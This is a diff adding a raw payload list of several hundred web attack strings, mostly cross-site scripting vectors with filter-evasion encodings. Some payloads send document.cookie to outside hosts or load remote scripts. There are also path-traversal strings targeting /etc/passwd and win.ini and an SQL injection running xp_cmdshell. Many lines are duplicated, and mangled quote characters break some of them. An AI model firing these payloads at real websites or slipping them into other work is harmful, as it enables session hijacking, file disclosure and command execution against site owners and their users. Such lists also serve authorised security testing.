@@ -1,0 +1,263 @@
+"><script>"
+' onfocus = 'alert(XSS);
+" onfocus = "alert(XSS);
+<q/oncut=alert(1)>
+javas&#13;cript:alert(1)
+java&#115;cript:alert(1)
+javasjavascriptcript:alert(1)
+'> <a href = 'javascript:alert(XSS);
+"> <a href = "javascript:alert(XSS);
+<script>confirm      (1);</script>
+<img src=x      onerror=prompt(1);>
+<img/src=aaa.jpg      onerror=prompt(1);
+<video src=x      onerror=prompt(1);>
+<audio src=x      onerror=prompt(1);>
+<iframe src="javascript:alert(2)">
+";document.body.addEventListener("DOMActivate",alert(1))//
+";document.body.addEventListener("DOMActivate",prompt(1))//
+";document.body.addEventListener("DOMActivate",confirm(1))//
+<img style="xss:expression(alert(0))"> // Works upto IE7.
+<div style="color:rgb(&#039;&#039;x:expression(alert(1))"></div> 
+<a onmouseover="javascript:window.onerror=alert;throw 1>
+<img src=x onerror="javascript:window.onerror=alert;throw 1">
+<body/onload=javascript:window.onerror=eval;throw&#039;=alert\x281\x29&#039;
+"> <script>alert("WXSS")</script>
+'> <<script>alert("WXSS");//<</script>
+"> <script>alert('XSS')</script>
+'> <script>alert("WXSS")</script>
+<<script>alert("WXSS");//<</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+='><script>alert(document.cookie)</script> 
+<form action="Javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
+<isindex action=data:text/html, type=image>
+<img src="javascript:alert('XSS')"> 
+<table background=javascript:alert(1)></table>
+<video poster=javascript:alert(1)
+<applet code="javascript:confirm(document.cookie);">
+\";alert('XSS');//
+<script>alert('__XSS__')</script>
+<script>alert("__XSS__")</script>
+<ScRiPt>alert('__XSS__')</sCrIpT>
+<ScRiPt>alert("__XSS__")</sCrIpT>
+<script>String.fromCharCode(0,__XSS__,1)</script>
+<ScRiPt>String.fromCharCode(0,__XSS__,1)</sCrIpT>
+<script src=http://__XSS__/x.js></script>
+<ScRiPt src=http://__XSS__/x.js></sCrIpT>
+<script[TAB]src=http://__XSS__/x.js></script>
+<ScRiPt[TAB]src=http://__XSS__/x.js></sCrIpT>
+
+<img src=javascript:alert('__XSS__')>
+<img src=javascript:alert("__XSS__")>
+<img src=javascript:String.fromCharCode(0,__XSS__,1)>
+<img src=JaVaScRiPt:String.fromCharCode(0,__XSS__,1)>
+<img src=JaVaS\tcRiPt:String.fromCharCode(0,__XSS__,1)>
+<img src=jav&#x09;ascript:alert('__XSS__');>
+<img src=jav&#x09;ascript:alert("__XSS__");>
+<img src=. onerror=alert("__XSS__")>
+<img src=. onerror=alert('__XSS__')>
+<img src=. onerror=String.fromCharCode(0,__XSS__,1)>
+<img[TAB]src=.[TAB]onerror=String.fromCharCode(0,__XSS__,1)>
+
+<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;__XSS__;&#39;&#41;>
+<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27__XSS__&#x27&#x29>
+<img[TAB]src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27__XSS__&#x27&#x29>
+
+<script >alert('__XSS__')</script >
+<script >alert("__XSS__")</script >
+<script >String.fromCharCode(0,__XSS__,1)</script >
+<ScRiPt >String.fromCharCode(0,__XSS__,1)</ sCrIpT>
+<ScRiPt[TAB]>String.fromCharCode(0,__XSS__,1)</[TAB]sCrIpT>
+<script/>alert('__XSS__')</script/>
+<script/>alert("__XSS__")</script/>
+<ScRiPt/>alert('__XSS__')</sCrIpT/>
+<ScRiPt/>alert("__XSS__")</sCrIpT/>
+<script/ src=http://__XSS__/x.js></script/>
+<ScRiPt/ src=http://__XSS__/x.js></sCrIpT/>
+<scr<script>ipt>alert('__XSS__')</script>
+<scr<script>ipt>alert('__XSS__')</scr</script>ipt>
+<scr<script>ipt>alert("__XSS__")</script>
+<scr<script>ipt>alert("__XSS__")</scr</script>ipt>
+<scr<script>ipt>String.fromCharCode(0,__XSS__,1)</script>
+<scr<script>ipt>String.fromCharCode(0,__XSS__,1)</scr</script>ipt>
+<scr<script>ipt src=http://__XSS__/x.js></script>
+<scr<script>ipt src=http://__XSS__/x.js></scr</script>ipt>
+<object data="javascript:alert('__XSS__')">
+<object data=javascript:String.fromCharCode(0,__XSS__,1)>
+<object[TAB]data=javascript:String.fromCharCode(0,__XSS__,1)>
+<object><param name=x value=javascript:alert('__XSS__')></object>
+<object><param name=x value=javascript:alert("__XSS__")></object>
+<object><param name=x value=javascript:String.fromCharCode(0,__XSS__,1)></object>
+
+%3cscript%3ealert("WXSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+<xss><script>alert('WXSS')</script></vulnerable>
+'><IMG%20SRC='javascript:alert(document.cookie)'>
+"><IMG%20SRC="javascript:alert('WXSS');">
+"><IMG%20SRC="javascript:alert('WXSS')"
+'><IMG%20SRC=javascript:alert('WXSS')>
+'><IMG%20SRC=JaVaScRiPt:alert('WXSS')>
+'><IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+"><IMG%20SRC=`javascript:alert("'WXSS'")`>
+"><IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+"><IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+"><IMG%20SRC='javasc	ript:alert(document.cookie)'>
+"><IMG%20SRC="jav	ascript:alert('WXSS');">
+"><IMG%20SRC="jav&#x09;ascript:alert('WXSS');">
+"><IMG%20SRC="jav&#x0A;ascript:alert('WXSS');">
+"><IMG%20SRC="jav&#x0D;ascript:alert('WXSS');">
+"><IMG%20SRC="%20&#14;%20javascript:alert('WXSS');">
+"><IMG%20DYNSRC="javascript:alert('WXSS')">
+"><IMG%20LOWSRC="javascript:alert('WXSS')">
+"><IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+"><IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+"><IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+"><IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+';alert(String.fromCharCode(88,83,83))//\';
+';alert(String.fromCharCode(88,83,83))//";
+';alert(String.fromCharCode(88,83,83))//\";
+';alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+'';!--"<XSS>=&{()} 
+%0a%0a<script>alert(\"Vulnerable\")</script>.jsp 
+%22%3cscript%3ealert(%22xss%22)%3c/script%3e 
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
+%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini 
+%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e 
+%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e 
+%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html 
+a?<script>alert('Vulnerable')</script> 
+"><script>alert('Vulnerable')</script> 
+';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt'--&& 
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E 
+%3Cscript%3Ealert(document. domain);%3C/script%3E& 
+%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}
+'';!--"<XSS>=&{()} 
+'><IMG SRC="javascript:alert('XSS');"> 
+"><IMG SRC=javascript:alert('XSS')> 
+'><IMG SRC=JaVaScRiPt:alert('XSS')> 
+'><IMG SRC=JaVaScRiPt:alert("XSS")> 
+'><IMG SRC=javascript:alert('XSS')> 
+'><IMG SRC=javascript:alert('XSS')> 
+'><IMG SRC=javascript:alert('XSS')> 
+'><IMG SRC="jav	ascript:alert('XSS');"> 
+'><IMG SRC="jav ascript:alert('XSS');"> 
+'><IMG SRC="javascript:alert('XSS');"> 
+"<IMG SRC=java\0script:alert(\"XSS\")>";' > out 
+'><IMG SRC=" javascript:alert('XSS');"> 
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT> 
+<BODY BACKGROUND="javascript:alert('XSS')"> 
+<BODY ONLOAD=alert('XSS')> 
+'><IMG DYNSRC="javascript:alert('XSS')"> 
+'><IMG LOWSRC="javascript:alert('XSS')"> 
+<BGSOUND SRC="javascript:alert('XSS');"> 
+<br size="&{alert('XSS')}"> 
+<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer> 
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');"> 
+'><IMG SRC='vbscript:msgbox("XSS")'> 
+'><IMG SRC="mocha:[code]"> 
+'><IMG SRC="livescript:[code]"> 
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"> 
+<IFRAME SRC=javascript:alert('XSS')></IFRAME> 
+<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET> 
+<TABLE BACKGROUND="javascript:alert('XSS')"> 
+<DIV STYLE="background-image: url(javascript:alert('XSS'))"> 
+<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"> 
+<DIV STYLE="width: expression(alert('XSS'));"> 
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE> 
+'><IMG STYLE='xss:expre\ssion(alert("XSS"))'> 
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE> 
+<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A> 
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> 
+<BASE HREF="javascript:alert('XSS');//"> 
+getURL("javascript:alert('XSS')") 
+a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d); 
+<XML SRC="javascript:alert('XSS');"> 
+"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><" 
+<SCRIPT SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT> 
+<IMG SRC="javascript:alert('XSS')" 
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js></SCRIPT>'"--> 
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"> 
+<SCRIPT a=">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+<SCRIPT =">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+<SCRIPT a=">" '' SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+<SCRIPT "a='>'" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.ha.ckers.org/a.js"></SCRIPT> 
+><script>alert(document.cookie)</script>  
+=¡¯><script>alert(document.cookie)</script>  
+<script>alert(document.cookie)</script>  
+<script>alert(vulnerable)</script>  
+%3Cscript%3Ealert(¡¯XSS¡¯)%3C/script%3E  
+<s&#99;ript>alert(¡¯XSS¡¯)</script>  
+<img src="javas&#99;ript:alert(¡¯XSS¡¯)">  
+%0a%0a<script>alert(\"Vulnerable\")</script>.jsp  
+%22%3cscript%3ealert(%22xss%22)%3c/script%3e  
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  
+%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini  
+%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e  
+%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e  
+%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html   
+&lt;script&gt;alert(¡¯Vulnerable¡¯);&lt;/script&gt  
+<script>alert(¡¯Vulnerable¡¯)</script>  
+?sql_debug=1  
+a%5c.aspx  
+a.jsp/<script>alert(¡¯Vulnerable¡¯)</script>  
+a/  
+a?<script>alert(¡¯Vulnerable¡¯)</script>  
+"><script>alert(¡¯Vulnerable¡¯)</script>  
+¡¯;exec%20master..xp_cmdshell%20¡¯dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt¡¯--&&  
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E  
+%3Cscript%3Ealert(document. domain);%3C/script%3E&  
+%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=  
+<IMG SRC="javascript:alert(¡¯XSS¡¯);">  
+<IMG SRC=javascript:alert(¡¯XSS¡¯)>  
+<IMG SRC=JaVaScRiPt:alert(¡¯XSS¡¯)>  
+<IMG SRC=JaVaScRiPt:alert(&quot;XSS&quot;)>  
+<IMG SRC=\'#\'" 
+<IMG SRC=\'#\'" 
+<IMG SRC=\'#\'" 
+<IMG SRC="jav&#x09;ascript:alert(¡¯XSS¡¯);">  
+<IMG SRC="jav&#x0A;ascript:alert(¡¯XSS¡¯);">  
+<IMG SRC="jav&#x0D;ascript:alert(¡¯XSS¡¯);">  
+"<IMG SRC=java\0script:alert(\"XSS\")>";¡¯ > out  
+<IMG SRC=\'#\'" 
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>  
+<BODY BACKGROUND="javascript:alert(¡¯XSS¡¯)">  
+<BODY ONLOAD=alert(¡¯XSS¡¯)>  
+<IMG DYNSRC="javascript:alert(¡¯XSS¡¯)">  
+<IMG LOWSRC="javascript:alert(¡¯XSS¡¯)">  
+<BGSOUND SRC="javascript:alert(¡¯XSS¡¯);">  
+<br size="&{alert(¡¯XSS¡¯)}">  
+<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>  
+<LINK REL="stylesheet" HREF="javascript:alert(¡¯XSS¡¯);">  
+<IMG SRC=¡¯vbscript:msgbox("XSS")¡¯>  
+<IMG SRC="mocha:[code]">  
+<IMG SRC="livescript:[code]">  
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(¡¯XSS¡¯);">  
+<IFRAME SRC=javascript:alert(¡¯XSS¡¯)></IFRAME>  
+<FRAMESET><FRAME SRC=javascript:alert(¡¯XSS¡¯)></FRAME></FRAMESET>  
+<TABLE BACKGROUND="javascript:alert(¡¯XSS¡¯)">  
+<DIV STYLE="background-image: url(javascript:alert(¡¯XSS¡¯))">    
+<DIV STYLE="width: expression(alert(¡¯XSS¡¯));">  
+<STYLE>@im\port¡¯\ja\vasc\ript:alert("XSS")¡¯;</STYLE>  
+<IMG STYLE=¡¯xss:expre\ssion(alert("XSS"))¡¯>  
+<STYLE TYPE="text/javascript">alert(¡¯XSS¡¯);</STYLE>  
+<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert(¡¯XSS¡¯)");}</STYLE><A CLASS=XSS></A>  
+<STYLE type="text/css">BODY{background:url("javascript:alert(¡¯XSS¡¯)")}</STYLE>  
+<BASE HREF="javascript:alert(¡¯XSS¡¯);//">  
+getURL("javascript:alert(¡¯XSS¡¯)")  
+a="get";b="URL";c="javascript:";d="alert(¡¯XSS¡¯);";eval(a+b+c+d);  
+<XML SRC="javascript:alert(¡¯XSS¡¯);">  
+"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert(¡¯XSS¡¯);}</SCRIPT><"  
+<SCRIPT SRC="/news/UploadFiles_4577_9994/200608/20060807015405416.jpg"></SCRIPT>  
+<IMG SRC="javascript:alert(¡¯XSS¡¯)"   
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT 
